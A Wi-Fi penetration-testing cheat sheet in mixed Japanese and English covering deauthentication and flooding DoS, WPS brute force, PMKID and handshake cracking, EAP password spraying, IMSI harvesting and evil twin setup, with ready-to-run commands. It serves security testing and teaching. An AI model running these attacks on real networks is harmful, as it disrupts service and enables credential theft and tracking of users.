# Pentesting Wifi

{{#include ../../banners/hacktricks-training.md}}

## Wifi の基本コマンド
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
airodump-ng wlan0mon --wps #Scan WPS
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
iwlist wlan0 scan #Scan available wifis
```
## ツール

### Hijacker & NexMon (Android の内部 Wi-Fi)


{{#ref}}
enable-nexmon-monitor-and-injection-on-android.md
{{#endref}}

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**docker で airgeddon を実行する**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
From: [https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux](https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux)

### wifiphisher

Evil Twin、KARMA、Known Beacons攻撃を実行し、その後phishing templateを使用してネットワークの実際のパスワードを入手したり、ソーシャルネットワークの認証情報を取得できます。
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

このツールは **WPS/WEP/WPA-PSK** 攻撃を自動化します。自動で以下を実行します:

- インターフェースを monitor mode に設定する
- 利用可能なネットワークをスキャンし、ターゲットを選択させる
- WEP の場合 - WEP 攻撃を開始する
- WPA-PSK の場合
- WPS の場合: Pixie dust attack と bruteforce attack（brute-force attack は時間がかかる可能性があるので注意）。null PIN や database/generated PINs は試行しない点に注意。
- AP から PMKID をキャプチャしてクラックを試みる
- AP のクライアントを deauthenticate して handshake をキャプチャしようとする
- PMKID または Handshake があれば、top5000 パスワードを使って bruteforce を試みる

## Attacks Summary

- **DoS**
- Deauthentication/disassociation -- 全員（または特定の ESSID/Client）を切断する
- Random fake APs -- ネットワークを隠す、スキャナをクラッシュさせる可能性がある
- Overload AP -- AP を停止させようとする（通常あまり有用ではない）
- WIDS -- IDS に干渉する
- TKIP, EAPOL -- 一部の AP を DoS するための特定の攻撃
- **Cracking**
- Crack **WEP** (several tools and methods)
- **WPA-PSK**
- **WPS** pin "Brute-Force"
- **WPA PMKID** bruteforce
- \[DoS +] **WPA handshake** capture + Cracking
- **WPA-MGT**
- **Username capture**
- **Bruteforce** Credentials
- **Evil Twin** (with or without DoS)
- **Open** Evil Twin \[+ DoS] -- captive portal creds を取得したり、LAN 攻撃を行ったりするのに有用
- **WPA-PSK** Evil Twin -- パスワードが分かっている場合にネットワーク攻撃に有用
- **WPA-MGT** -- 会社の credentials を取得するのに有用
- **KARMA, MANA**, **Loud MANA**, **Known beacon**
- **+ Open** -- captive portal creds を取得したり、LAN 攻撃を行ったりするのに有用
- **+ WPA** -- WPA handshakes の取得に有用

## DOS

### Deauthentication Packets

**説明元** [**here**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

**Deauthentication** attacks は、Wi-Fi ハッキングで広く使われる手法で、"management" フレームを偽造して **デバイスをネットワークから強制的に切断する** ことを含みます。これらの暗号化されていないパケットはクライアントを欺いて正当なネットワークから送られたものと信じ込ませ、攻撃者が WPA handshakes を収集して Cracking を行ったり、ネットワーク接続を持続的に妨害したりすることを可能にします。この手法はその単純さゆえに衝撃的であり、広く利用されていてネットワークセキュリティに重大な影響を与えます。

**Deauthentication using Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
- -0 は deauthentication を意味する
- 1 は送信する deauths の数（必要なら複数送信可能）；0 は連続送信を意味する
- -a 00:14:6C:7E:40:80 はアクセスポイントの MAC アドレス
- -c 00:0F:B5:34:30:30 は deauthenticate するクライアントの MAC アドレス；省略するとブロードキャスト deauthentication が送信される（常に動作するとは限らない）
- ath0 はインターフェース名

### Disassociation Packets

**Disassociation packets** は deauthentication packets と同様に、Wi‑Fi ネットワークで使用される管理フレームの一種です。これらのパケットは、デバイス（ノートパソコンやスマートフォンなど）とアクセスポイント (AP) の接続を切断するために使われます。disassociation と deauthentication の主な違いは使用状況にあります。AP が **deauthentication packets を送出して不正なデバイスをネットワークから明示的に排除するのに対し、disassociation packets は通常 AP がシャットダウン、再起動、または移動している際に送信され、接続中のノードを切断する必要が生じる場合に使用されます**。

**この攻撃は mdk4(mode "d") で実行できます：**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **mdk4によるさらに多くのDOS攻撃**

**こちら** [**here**](https://en.kali.tools/?p=864)**。**

**ATTACK MODE b: Beacon Flooding**

clientsに対してfake APsを表示するためにbeacon framesを送信します。これは時にnetwork scannersやdriversをクラッシュさせることさえあります！
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**ATTACK MODE a: Authentication Denial-Of-Service**

射程内のすべてのアクセス可能な Access Points (APs) に authentication frames を送信すると、特に多数の clients が関与している場合に、これらの APs に過負荷を与えることがあります。  
この大量のトラフィックはシステムの不安定化を招き、いくつかの APs がフリーズしたりリセットされることさえあります。
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**ATTACK MODE p: SSID Probing and Bruteforcing**

Probing Access Points (APs) はSSIDが正しく表示されているかを確認し、APの到達範囲を特定します。 この手法は、wordlistの有無にかかわらず **bruteforcing hidden SSIDs** と組み合わせることで、隠されたネットワークの特定やアクセスに役立ちます。

**ATTACK MODE m: Michael Countermeasures Exploitation**

異なるQoSキューにランダムまたは重複したパケットを送ると、**TKIP APs** 上で Michael Countermeasures を誘発し、APが1分間シャットダウンすることがあります。 この手法は効率的な **DoS** (Denial of Service) 攻撃戦術です。
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**ATTACK MODE e: EAPOL Start and Logoff Packet Injection**

APに**EAPOL Start frames**を大量に送信すると、**fake sessions**が生成され、APが過負荷になり正当なクライアントの接続が遮断されます。あるいは、**fake EAPOL Logoff messages**を注入してクライアントを強制的に切断することでも、どちらの方法もネットワークサービスを効果的に妨害します。
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**ATTACK MODE s: IEEE 802.11s メッシュネットワークに対する攻撃**

メッシュネットワークにおけるリンク管理およびルーティングに対するさまざまな攻撃。

**ATTACK MODE w: WIDS Confusion**

複数の WDS ノードや偽 rogue APs にクライアントをクロス接続することで、Intrusion Detection and Prevention Systems を混乱させ、潜在的なシステム悪用を引き起こす可能性があります。
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**ATTACK MODE f: Packet Fuzzer**

多様なパケットソースとパケット操作のための包括的な修飾子セットを特徴とする packet fuzzer。

### **Airggedon**

_**Airgeddon**_ は前述のほとんどの攻撃を提供します:

![](<../../images/image (95).png>)

## WPS

WPS (Wi‑Fi Protected Setup) は、**WPA** や **WPA2** Personal で暗号化されたネットワークにデバイスをルーターに接続するプロセスを簡素化し、設定の速度と容易さを向上させます。容易に破られる WEP には効果がありません。WPS は 8 桁の PIN を使用し、これが 2 つの半分に分けて検証されるため、組み合わせ数が限られている（約 11,000 通り）ことで brute-force attacks に対して脆弱です。

### WPS Bruteforce

この操作を実行する主なツールは 2 つあります: Reaver と Bully。

- **Reaver** は WPS に対する堅牢で実用的な攻撃として設計されており、さまざまなアクセスポイントや WPS 実装でテストされています。
- **Bully** は C で書かれた WPS brute force attack の **新しい実装** です。オリジナルの reaver コードに比べて、依存関係が少ない、メモリと CPU パフォーマンスが改善されている、エンディアンの処理が正しい、より堅牢なオプション群を持つ、などの利点があります。

この攻撃は **WPS PIN の脆弱性** を突き、特に最初の 4 桁が露出し、最後の桁がチェックサムとして機能する点により brute-force attack を容易にします。しかし、積極的な攻撃者の **blocking MAC addresses** のような brute-force attacks に対する防御は、攻撃を継続するために **MAC address rotation** を要求します。

Bully や Reaver のようなツールで WPS PIN を取得すると、攻撃者は WPA/WPA2 PSK を導出でき、**persistent network access** が確保されます。
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Smart Brute Force**

この改良された手法は、既知の脆弱性を利用して WPS PINs を標的にします:

1. **Pre-discovered PINs**: 共通の WPS PINs を使用することで知られる特定メーカーに紐づく既知の PIN のデータベースを利用します。このデータベースは MAC-addresses の最初の3オクテットと、当該メーカーに対して予想される PIN を相関付けています。
2. **PIN Generation Algorithms**: ComputePIN や EasyBox のようなアルゴリズムを利用して、AP の MAC-address に基づき WPS PINs を計算します。Arcadyan アルゴリズムは追加で device ID を必要とし、PIN 生成プロセスにもう一層の要素を加えます。

### WPS Pixie Dust attack

**Dominique Bongard** は、一部の Access Points (APs) が秘密コード、いわゆる nonces (E-S1 と E-S2) の生成に関して欠陥を持っていることを発見しました。これらの nonces が判明すれば、AP の WPS PIN の解析は容易になります。AP はその PIN が正当なものであり偽の (rogue) AP ではないことを示すために、特別なコード (hash) の中に PIN を含めて公開します。これらの nonces は本質的に、WPS PIN を格納した「金庫」を開けるための「鍵」です。詳細は [here](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>) を参照してください。

簡単に言えば、問題は一部の APs が接続プロセス中に PIN を暗号化するために十分にランダムな鍵を使用していなかったことです。これにより PIN はネットワーク外部から推測されやすくなり (offline brute force attack) の対象になります。
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
デバイスを monitor mode に切り替えたくない、または `reaver` や `bully` に問題がある場合は、[OneShot-C](https://github.com/nikita-yfh/OneShot-C) を試してみてください。このツールは monitor mode に切り替えずに Pixie Dust attack を実行できます。
```bash
./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37
```
### Null Pin attack

設計が不十分な一部のシステムでは、**Null PIN**（空または存在しないPIN）でアクセスが許可されてしまうことがあり、かなり珍しい挙動です。 **Reaver**はこの脆弱性の検査が可能ですが、**Bully**は対応していません。
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

提案されているすべてのWPS攻撃は、_**airgeddon.**_ を使って簡単に実行できます。

![](<../../images/image (219).png>)

- 5 と 6 は **独自の PIN**（ある場合）を試すことができます
- 7 と 8 は **Pixie Dust attack** を実行します
- 13 は **NULL PIN** をテストできます
- 11 と 12 は利用可能なデータベースから選択した AP に関連する **PINs を再取得** し、ComputePIN、EasyBox、および任意で Arcadyan を使用して可能な **PINs** を**生成**します（推奨 — やってみてもいいかも）
- 9 と 10 は **あらゆる可能な PIN** をテストします

## **WEP**

現在では壊れていてほとんど使われていません。_**airgeddon**_ にはこの種の保護を攻撃するための「All-in-One」と呼ばれる WEP オプションがあることを覚えておいてください。他のツールにも同様のオプションがあります。

![](<../../images/image (432).png>)

---

---

## WPA/WPA2 PSK

### PMKID

2018年に、**hashcat** は新しい攻撃手法を[公開](https://hashcat.net/forum/thread-7717.html)しました。その手法は、必要なのが**たった1パケット**だけで、ターゲットの AP にクライアントが接続されている必要がなく、攻撃者と AP の間のやり取りだけで成立するという点でユニークです。

多くの最新ルーターは、認証時の **最初の EAPOL フレーム** に `Robust Security Network` として知られる **オプションフィールド** を追加します。これには `PMKID` が含まれます。

元の投稿が説明しているように、**PMKID** は既知のデータを用いて作成されます:
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
「PMK Name」が一定で、APのBSSIDとstationが分かっており、`PMK`が完全な4-way handshakeのものと同一であるため、**hashcat**はこの情報を使ってPSKをcrackし、パスフレーズを復元できます！

この情報を**収集**し、ローカルでパスワードを**bruteforce**するには、次のようにします:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
**PMKIDs キャプチャ済み** は **console** に表示され、さらに **保存** は \_ **/tmp/attack.pcap**\_\
次に、キャプチャを **hashcat/john** 形式に変換してクラッキングしてください:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
正しい hash のフォーマットは **4 parts** を含むことに注意してください、例: `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838`。あなたのものが **のみ** **3 parts** を含む場合、それは **無効** です（PMKID capture が有効ではありませんでした）。

また、`hcxdumptool` は **handshakes** も capture することに注意してください（次のような表示が出ます: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**）。`cap2hccapx` を使って **handshakes** を **hashcat**/**john** 形式に変換できます。
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_このツールでキャプチャした一部の handshakes は正しいパスワードを知っていても crack できないことがあると気づきました。可能であれば従来の方法でも handshakes をキャプチャするか、このツールで複数の handshakes をキャプチャすることをおすすめします._

### Handshake キャプチャ

An attack on **WPA/WPA2** networks can be executed by capturing a **handshake** and attempting to **crack** the password **offline**. This process involves monitoring the communication of a specific network and **BSSID** on a particular **channel**. Here's a streamlined guide:

1. Identify the **BSSID**, **channel**, and a **connected client** of the target network.
2. Use `airodump-ng` to monitor the network traffic on the specified channel and BSSID, hoping to capture a handshake. The command will look like this:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
3. handshake をキャプチャする確率を高めるため、クライアントをネットワークから一時的に切断して再認証を強制します。これは `aireplay-ng` コマンドで行え、クライアントに deauthentication packets を送信します：
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_クライアントが deauthenticated されたため、別の AP に接続しようとするか、場合によっては別の network に接続することがあることに注意してください。_

Once in the `airodump-ng` appears some handshake information this means that the handshake was captured and you can stop listening:

![](<../../images/image (172) (1).png>)

handshake がキャプチャされたら、`aircrack-ng` で **crack** できます:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### ファイル内に handshake があるか確認

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_このツールが、完了したhandshakeより前にそのESSIDの未完了handshakeを見つけた場合、有効なhandshakeを検出できません。_

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
## **WPA Enterprise (MGT)**

**enterprise WiFi 環境では、さまざまな認証方式に遭遇します**。それぞれが異なるセキュリティレベルや管理機能を提供します。`airodump-ng` のようなツールでネットワークトラフィックを確認すると、これらの認証タイプの識別子に気づくことがあります。代表的な方式には次のようなものがあります：
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Generic Token Card)**:
- この方式はハードウェアトークンとワンタイムパスワードを EAP-PEAP 内でサポートします。MSCHAPv2 と異なり peer challenge を使用せず、パスワードを平文でアクセスポイントに送信するため、ダウングレード攻撃のリスクがあります。
2. **EAP-MD5 (Message Digest 5)**:
- クライアントからパスワードの MD5 ハッシュを送信します。辞書攻撃に弱く、サーバー認証がなく、セッション固有の WEP キーを生成できないため、**推奨されません**。
3. **EAP-TLS (Transport Layer Security)**:
- クライアント側とサーバー側の両方の証明書を用いた認証を行い、通信を保護するためにユーザー単位およびセッション単位の動的な WEP キーを生成できます。
4. **EAP-TTLS (Tunneled Transport Layer Security)**:
- 暗号化トンネルを介した相互認証を提供し、動的なユーザー単位・セッション単位の WEP キーを導出する方法を備えています。サーバー側の証明書のみが必要で、クライアントは資格情報を使用します。
5. **PEAP (Protected Extensible Authentication Protocol)**:
- TLS トンネルを作成して保護された通信を行う点で EAP と同様に機能します。トンネルによる保護により、EAP の上でより弱い認証プロトコルを使うことが可能になります。
- **PEAP-MSCHAPv2**: 通常 PEAP と呼ばれ、脆弱な MSCHAPv2 の challenge/response 機構を TLS トンネルで保護する組み合わせです。
- **PEAP-EAP-TLS (or PEAP-TLS)**: EAP-TLS と類似していますが、証明書交換の前に TLS トンネルを確立することで追加のセキュリティ層を提供します。

You can find more information about these authentication methods [here ](https://en.wikipedia.org/wiki/Extensible_Authentication_Protocol)and [here](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Username Capture

Reading [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27) it looks like if you are using **EAP** the **"Identity"** **messages** must be **supported**, and the **username** is going to be sent in **clear** in the **"Response Identity"** messages.

Even using one of the most secure of authentication methods: **PEAP-EAP-TLS**, it is possible to **capture the username sent in the EAP protocol**. To do so, **capture a authentication communication** (start `airodump-ng` inside a channel and `wireshark` in the same interface) and filter the packets by`eapol`.\
Inside the "**Response, Identity**" packet, the **username** of the client will appear.

![](<../../images/image (850).png>)

### Anonymous Identities

Identity hiding is supported by both EAP-PEAP and EAP-TTLS. In the context of a WiFi network, an EAP-Identity request is typically initiated by the access point (AP) during the association process. To ensure the protection of user anonymity, the response from the EAP client on the user's device contains only the essential information required for the initial RADIUS server to process the request. This concept is illustrated through the following scenarios:

- EAP-Identity = anonymous
- このシナリオでは、すべてのユーザーが擬名の "anonymous" をユーザー識別子として使用します。initial RADIUS server は EAP-PEAP または EAP-TTLS サーバーとして動作し、PEAP/TTLS プロトコルのサーバー側を管理します。内部（保護された）認証方式はローカルで処理されるか、リモート（home）RADIUS server に委任されます。
- EAP-Identity = anonymous@realm_x
- この場合、異なる realm のユーザーは自身の身元を隠しつつ、所属する realm を示します。これにより initial RADIUS server は EAP-PEAP または EAP-TTLS の要求を各ユーザーの home realm にある RADIUS servers にプロキシでき、それらが PEAP または TTLS サーバーとして機能します。initial RADIUS server は RADIUS リレー ノードとしてのみ動作します。
- あるいは initial RADIUS server が EAP-PEAP または EAP-TTLS サーバーとして機能し、保護された認証方式を直接処理するか別のサーバーに転送することも可能です。これにより異なる realm に対して別個のポリシーを設定できます。

EAP-PEAP では、PEAP server と PEAP client 間で TLS トンネルが確立された後、PEAP server が EAP-Identity request を開始し、それを TLS トンネル経由で送信します。クライアントはこの 2 回目の EAP-Identity request に対して、暗号化されたトンネル内でユーザーの真の identity を含む EAP-Identity response を返します。これにより 802.11 トラフィックを傍受している者に対してユーザーの実際の識別子が露呈するのを効果的に防止します。

EAP-TTLS は若干異なる手順を取ります。EAP-TTLS ではクライアントは通常 PAP または CHAP を用いて TLS トンネルで保護された認証を行います。この場合、クライアントはトンネル確立後に送信する初期 TLS メッセージ内に User-Name 属性と Password または CHAP-Password 属性を含めます。

プロトコルに関わらず、PEAP/TTLS server は TLS トンネル確立後にユーザーの真の identity を把握します。真の identity は user@realm あるいは単に user として表現されます。もし PEAP/TTLS server がユーザー認証も担当する場合、ユーザーの identity を得た後に TLS トンネルで保護された認証方式を実行します。あるいは PEAP/TTLS server はユーザーの home RADIUS server へ新しい RADIUS request を転送することもあります。この新しい RADIUS request には PEAP や TTLS のプロトコル層は含まれません。保護された認証方式が EAP の場合、内部 EAP メッセージは EAP-PEAP や EAP-TTLS のラッパーなしで home RADIUS server に送信されます。outgoing RADIUS メッセージの User-Name 属性には incoming RADIUS request の匿名 User-Name の代わりにユーザーの真の identity が入ります。保護された認証方式が PAP または CHAP（TTLS のみサポート）である場合、TLS ペイロードから抽出された User-Name や他の認証属性が outgoing RADIUS メッセージに差し替えられ、incoming RADIUS request に含まれていた匿名 User-Name や TTLS EAP-Message 属性が置き換えられます。

For more info check [https://www.interlinknetworks.com/app_notes/eap-peap.htm](https://www.interlinknetworks.com/app_notes/eap-peap.htm)

### SIM-based EAP (EAP-SIM/EAP-AKA) identity leakage (IMSI exposure)

SIM-based Wi‑Fi authentication using EAP‑SIM/EAP‑AKA over 802.1X can leak the permanent subscriber identifier (IMSI) in cleartext during the unauthenticated identity phase if the deployment doesn’t implement pseudonyms/protected identities or a TLS tunnel around the inner EAP.

Where the leak happens (high level):
- 802.11 association completes to the SSID (often carrier offload SSIDs like FreeWifi_secure, eduroam-like operator realms, etc.).
- Authenticator sends EAP-Request/Identity.
- Vulnerable clients answer EAP-Response/Identity with their permanent identity = IMSI encoded as a 3GPP NAI, prior to any protection.
- Example NAI: 20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
- Anyone passively listening to RF can read that frame. No 4-way handshake or TLS keying is needed.

Quick PoC: passive IMSI harvesting on EAP‑SIM/AKA networks lacking identity privacy
<details>
<summary>Click to expand</summary>
```bash
# 1) Enable monitor mode
airmon-ng start wlan0

# 2) Optional: lock channel to the target BSS
airodump-ng wlan0mon --essid <SSID>

# 3) Capture 802.1X/EAP frames
# Wireshark display filters:
#   eap || eapol
#   (identity specifically): eap.code == 2 && eap.type == 1
# Kismet: add source wlan0mon; enable 802.1X/EAP views
# tcpdump (pcap capture):
#   tcpdump -i wlan0mon -s 0 -w eapsim_identity.pcap

# 4) Wait for a device to auto-connect to the SSID
# 5) Inspect the first EAP-Response/Identity frame
# Expected: ASCII NAI containing IMSI, e.g.
#   20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
```
</details>

注意:
- 保護された識別子/擬名を使用しない生の EAP‑SIM/AKA を導入している場合、TLS トンネル確立前に動作します。
- 露出する値は加入者の SIM に紐づく恒久的な識別子であり、収集されると長期的な追跡やその後の電気通信上の悪用を可能にします。

影響
- プライバシー: 公共の場所での受動的な Wi‑Fi キャプチャからの恒久的なユーザー/デバイス追跡。
- 電気通信悪用の足がかり: IMSI があれば、SS7/Diameter へのアクセスを持つ攻撃者は位置照会や通話/SMS の傍受、MFA 窃取を試みることができます。

緩和策 / 確認ポイント
- クライアントが EAP‑SIM/AKA において 3GPP のガイダンス（例: 3GPP TS 33.402）に従い、匿名の外部識別子（擬名）を使用していることを確認してください。
- 識別フェーズをトンネル化することを推奨します（例: inner EAP‑SIM/AKA を運ぶ EAP‑TTLS/PEAP）。これにより IMSI が平文で送信されることはありません。
- association/auth のパケットキャプチャで、生の IMSI が EAP-Response/Identity に現れないことを確認してください。

Related: Telecom signalling exploitation with captured mobile identifiers
{{#ref}}
../pentesting-network/telecom-network-exploitation.md
{{#endref}}

### EAP-Bruteforce (password spray)

If the client is expected to use a **username and password** (notice that **EAP-TLS won't be valid** in this case), then you could try to get a **list** a **usernames** (see next part) and **passwords** and try to **bruteforce** the access using [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)**.**
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
この攻撃は `eaphammer` を使って実行することもできます:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## クライアント攻撃の理論

### ネットワーク選択とローミング

- 802.11 プロトコルはステーションが拡張サービスセット (ESS) に参加する方法を定義するが、ESS やその中のアクセスポイント (AP) を選択する基準は指定していない。
- ステーションは同じ ESSID を共有する複数の AP 間をローミングでき、建物やエリア全体で接続を維持できる。
- プロトコルはステーションが ESS に対して認証を行うことを要求するが、AP がステーションに対して認証することを義務付けてはいない。

### 優先ネットワークリスト (PNLs)

- ステーションは接続したすべての無線ネットワークの ESSID を優先ネットワークリスト (PNL) に、ネットワーク固有の設定情報とともに保存する。
- PNL は既知のネットワークへの自動接続に使われ、接続プロセスを簡略化してユーザー体験を向上させる。

### パッシブスキャン

- AP は定期的に beacon フレームをブロードキャストし、自身の存在や機能を通知する。ブロードキャストが無効でない限り、AP の ESSID も含まれる。
- パッシブスキャン中、ステーションは beacon フレームを受信して待ち受ける。beacon の ESSID がステーションの PNL のエントリと一致すると、その AP に自動的に接続することがある。
- デバイスの PNL を把握していると、既知のネットワークの ESSID を偽装してデバイスを rogue AP に接続させるといった悪用が可能になる。

### アクティブプローブ

- アクティブプローブは、近傍の AP とその特性を発見するためにステーションが probe request を送信することを含む。
- Directed probe request は特定の ESSID を指定して送られ、隠しネットワークであってもそのネットワークが範囲内にあるかどうか検出するのに役立つ。
- Broadcast probe request は SSID フィールドを null にして近隣のすべての AP に送られ、PNL の内容を明かさずに優先ネットワークがあるかどうか確認できる。

## インターネットにリダイレクトするシンプルな AP

より複雑な攻撃のやり方を説明する前に、単に **どのように** **AP** を **作成** し、その **トラフィック** を **へ** 接続されたインターフェースへ **リダイレクト** する **方法** を説明する。

Using `ifconfig -a` check that the wlan interface to create the AP and the interface connected to the Internet are present.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
設定ファイル `/etc/dnsmasq.conf` を作成する:
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
次に **IPs を設定** と **routes**:
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
そして、dnsmasq を **起動** します:
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```bash
apt-get install hostapd
```
設定ファイル `hostapd.conf` を作成する:
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**邪魔なプロセスを停止する** , **monitor mode**に設定し、**start hostapd**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### 転送とリダイレクト
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Evil Twin

Evil Twin攻撃は、WiFiクライアントがネットワークを認識する方法を悪用します。クライアントは主にネットワーク名（ESSID）に依存しており、base station (access point) がクライアントに対して自身を認証することを要求しません。主なポイントは以下です：

- **識別の困難さ**: デバイスは同じESSIDと暗号化方式を共有する正当なaccess pointsとrogue access pointsを区別するのが難しいです。実際のネットワークでは、カバレッジをシームレスに拡張するために同じESSIDを持つ複数のaccess pointsが使われることがよくあります。
- **クライアントのローミングと接続操作**: 802.11プロトコルはデバイスが同じESS内のaccess points間をroamすることを許します。攻撃者は、デバイスを現在のbase stationから切断させてrogueなものに接続させるよう誘導することでこれを悪用できます。これはより強い信号を提供したり、deauthentication packetsやjammingのような方法で正当なaccess pointへの接続を妨害することで実現できます。
- **実行上の課題**: 複数の適切に配置されたaccess pointsがある環境では、evil twin攻撃を成功させるのは困難です。単一の正当なaccess pointをDeauthenticatingしても、攻撃者が近隣のすべてのaccess pointsをdeauthenticateするか、戦略的にrogue access pointを配置しない限り、デバイスは別の正当なaccess pointに接続してしまうことが多いです。

You can create a very basic Open Evil Twin (no capabilities to route traffic to Internet) doing:
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
